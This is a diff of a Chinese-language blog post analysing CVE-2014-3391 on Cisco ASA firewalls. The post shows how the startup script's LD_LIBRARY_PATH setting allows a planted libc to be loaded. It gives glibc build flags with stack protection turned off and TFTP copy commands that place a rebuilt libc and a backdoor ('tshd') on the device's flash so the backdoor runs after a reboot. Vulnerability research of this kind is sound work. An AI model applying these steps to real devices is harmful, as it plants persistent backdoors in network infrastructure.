@@ -11,7 +11,7 @@
 
 
     <meta name="description" content="LD_LIBRARY_PATH环境变量会影响Loader的行为，它将告诉Loader在何处寻找共享库，并且其优先级高于系统默认加载路径。一般来说C程序链接其他.so文件时，查找库文件位置顺序如下： 1、编译时指定的位置2、LD_LIBRARY_PATH 指定的位置3、ldconfig 指定的位置4、&#x2F;lib（Linux动态链接库常放的位置）5、&#x2F;usr&#x2F;lib（Linux动态链接库常放的位置） L">
-<meta name="keywords" content="漏洞,Binary,CVE,Linux,Cisco,网络设备">
+<meta name="keywords" content="漏洞,Binary,CVE,Linux,网络设备,Cisco">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CVE-2014-3391——Cisco ASA防火墙libc hijack">
 <meta property="og:url" content="https:&#x2F;&#x2F;jontsang.github.io&#x2F;post&#x2F;e7d26c25.html">
@@ -19,7 +19,7 @@
 <meta property="og:description" content="LD_LIBRARY_PATH环境变量会影响Loader的行为，它将告诉Loader在何处寻找共享库，并且其优先级高于系统默认加载路径。一般来说C程序链接其他.so文件时，查找库文件位置顺序如下： 1、编译时指定的位置2、LD_LIBRARY_PATH 指定的位置3、ldconfig 指定的位置4、&#x2F;lib（Linux动态链接库常放的位置）5、&#x2F;usr&#x2F;lib（Linux动态链接库常放的位置） L">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;JonTsang&#x2F;Figurebed&#x2F;master&#x2F;img&#x2F;20190830103616.jpg">
-<meta property="og:updated_time" content="2019-09-02T01:59:34.094Z">
+<meta property="og:updated_time" content="2019-09-02T01:59:34.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;JonTsang&#x2F;Figurebed&#x2F;master&#x2F;img&#x2F;20190830103616.jpg">
 
@@ -178,7 +178,6 @@
 <p>1、编译时指定的位置<br>2、LD_LIBRARY_PATH 指定的位置<br>3、ldconfig 指定的位置<br>4、/lib（Linux动态链接库常放的位置）<br>5、/usr/lib（Linux动态链接库常放的位置）</p>
 <p><code>LD_LIBRARY_PATH</code>一般用来对测试放置于非加载路径的库文件，但如果该变量设置不当，我们还可以使用它来实现so hijack。</p>
 <a id="more"></a>
-
 <p>Cisco ASA防火墙中8.x版本中就存在这样一个漏洞，该漏洞源于ASA启动脚本没有正确设置 <code>LD_LIBRARY_PATH</code>环境变量。可能允许经过身份验证的本地攻击者注入恶意库文件并完全控制系统。</p>
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><ol>
 <li>分析环境：Kali Linux</li>
@@ -190,12 +189,8 @@
 </ol>
 <h2 id="Cisco-ASA启动过程分析"><a href="#Cisco-ASA启动过程分析" class="headerlink" title="Cisco ASA启动过程分析"></a>Cisco ASA启动过程分析</h2><p>Cisco ASA防火墙的底层是一个运行在x86/x86_64架构上的linux系统，并在防火墙上运行一个名为“lina”的程序，该程序实现了防火墙的全部业务功能。同时，还存在一个lina_monitor程序，负责主程序lina的启动和监控。<br><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831164700.png" alt><br>从上图可以看到，/asa/script目录下的shell脚本rcS控制着lina_monitor的启动方式，在该脚本第一行，又执行了另一个脚本rcS.common，让我们一起来看看rcS.common的内容：</p>
 <figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">sleep 7</span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk0 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk0; <span class="hljs-keyword">fi</span></span><br><span class="line"><span class="hljs-keyword">if</span> [ ! -e /mnt/disk1 ]; <span class="hljs-keyword">then</span> mkdir /mnt/disk1; <span class="hljs-keyword">fi</span></span><br><span class="line">mount=0</span><br><span class="line">partition=1</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> /sys/block/*d* ; <span class="hljs-keyword">do</span></span><br><span class="line">	[ -x <span class="hljs-string">"<span class="hljs-variable">$i</span>"</span> ] || <span class="hljs-built_in">continue</span></span><br><span class="line">	device=<span class="hljs-variable">$&#123;i#/sys/block/&#125;</span></span><br><span class="line">	devicepath=/dev/<span class="hljs-variable">$device</span><span class="hljs-variable">$partition</span></span><br><span class="line">	mountpoint=/mnt/disk<span class="hljs-variable">$mount</span></span><br><span class="line">	dosfsck -a -V <span class="hljs-variable">$devicepath</span></span><br><span class="line">	<span class="hljs-built_in">echo</span> <span class="hljs-string">"dosfsck(<span class="hljs-variable">$devicepath</span>) returned $?"</span></span><br><span class="line">	/asa/scripts/mount_flash.sh <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;/fserr ||</span><br><span class="line">	mount <span class="hljs-variable">$devicepath</span> <span class="hljs-variable">$mountpoint</span> 2&gt;&gt;/fserr ||</span><br><span class="line">	cat /fserr &gt;&amp;2</span><br><span class="line">	mount=$((<span class="hljs-variable">$mount</span> + 1))</span><br><span class="line"><span class="hljs-keyword">done</span></span><br><span class="line"></span><br><span class="line">rm -f /fserr</span><br><span class="line">mount -o remount,rw /dev/ram0 /</span><br><span class="line">tunctl &gt; /dev/null</span><br><span class="line">modprobe -q tipc 2&gt; /dev/null</span><br><span class="line">ifconfig tap0 127.0.2.2 up 2&gt; /dev/null</span><br><span class="line">tipc-config -netid=1234 -a=1.1.1 -be eth:tap0 2&gt; /dev/null </span><br><span class="line"> <span class="hljs-comment"># tune the VM system</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 2 &gt; /proc/sys/vm/overcommit_memory</span><br><span class="line"><span class="hljs-built_in">echo</span> 100 &gt; /proc/sys/vm/overcommit_ratio</span><br><span class="line"><span class="hljs-built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="hljs-built_in">ulimit</span> -s 1024</span><br><span class="line"> <span class="hljs-comment"># set shmmax to 3156M which is MAX_GUEST_RAM</span></span><br><span class="line"><span class="hljs-built_in">echo</span> 3309305856 &gt; /proc/sys/kernel/shmmax</span><br><span class="line"> <span class="hljs-comment"># kernel modules for environment monitoring</span></span><br><span class="line">modprobe -q tscsync tscsync_major=129 2&gt; /dev/null</span><br><span class="line">modprobe -q msrif 2&gt; /dev/null</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"|/asa/bin/coredump_helper %e %p %s %t"</span> &gt; /proc/sys/kernel/core_pattern</span><br><span class="line"> <span class="hljs-comment">#Config cgroup</span></span><br><span class="line">./asa/scripts/cgroup_config</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib"</span> &gt;&gt; /tmp/run_cmd</span><br></pre></td></tr></table></figure>
-<p>而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib</span><br></pre></td></tr></table></figure>
-<p>LD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。</p>
-<p>在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：</p>
-<figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgexec -g memory:privileged /asa/bin/lina_monitor -l</span><br></pre></td></tr></table></figure>
-<p>lina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，<strong>整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动</strong>。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。</p>
+<p>而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib</span><br></pre></td></tr></table></figure><br>LD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。</p>
+<p>在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgexec -g memory:privileged /asa/bin/lina_monitor -l</span><br></pre></td></tr></table></figure><br>lina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，<strong>整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动</strong>。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>让我们再回顾一下前面流程中的关键点：</p>
 <ol>
 <li><code>LD_LIBRARY_PATH</code>可以增加一个共享库搜索路径列表。并且先于系统默认加载路径。</li>
@@ -234,10 +229,7 @@
 <li>编译参数</li>
 </ol>
 <figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export CFLAGS="-O2 -U_FORTIFY_SOURCE -march=i686 -mtune=native -fno-stack-protector"</span><br><span class="line">../glibc-2.9/configure --prefix=/root/usr/ --disable-profile --enable-kernel=2.6.26</span><br></pre></td></tr></table></figure>
-
-<h2 id="上传文件测试"><a href="#上传文件测试" class="headerlink" title="上传文件测试"></a>上传文件测试</h2><p>将我们编译好的so文件和后门上传:</p>
-<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy tftp://10.1.1.21/libc-2.9-14.so disk0:/lib/libc.so.6</span><br><span class="line">copy tftp://10.1.1.21/tshd disk0:/tshd</span><br></pre></td></tr></table></figure>
-<p>重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了</p>
+<h2 id="上传文件测试"><a href="#上传文件测试" class="headerlink" title="上传文件测试"></a>上传文件测试</h2><p>将我们编译好的so文件和后门上传:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy tftp://10.1.1.21/libc-2.9-14.so disk0:/lib/libc.so.6</span><br><span class="line">copy tftp://10.1.1.21/tshd disk0:/tshd</span><br></pre></td></tr></table></figure><br>重启路由器，在Cisco CLI下执行show kernel process命令，可以看到后门已经在运行了</p>
 <p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165050.png" alt></p>
 <p><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190831165104.png" alt></p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20141008-asa" target="_blank" rel="noopener">Multiple Vulnerabilities in Cisco ASA Software</a><br><a href="https://gms.tf/ld_library_path-considered-harmful.html" target="_blank" rel="noopener">LD_LIBRARY_PATH considered harmful</a></p>
@@ -378,7 +370,7 @@
                         文章
                     </p>
                     <p class="title has-text-weight-normal">
-                        24
+                        25
                     </p>
                 </div>
             </div>
@@ -388,7 +380,7 @@
                         分类
                     </p>
                     <p class="title has-text-weight-normal">
-                        4
+                        5
                     </p>
                 </div>
             </div>
@@ -398,7 +390,7 @@
                         标签
                     </p>
                     <p class="title has-text-weight-normal">
-                        29
+                        30
                     </p>
                 </div>
             </div>
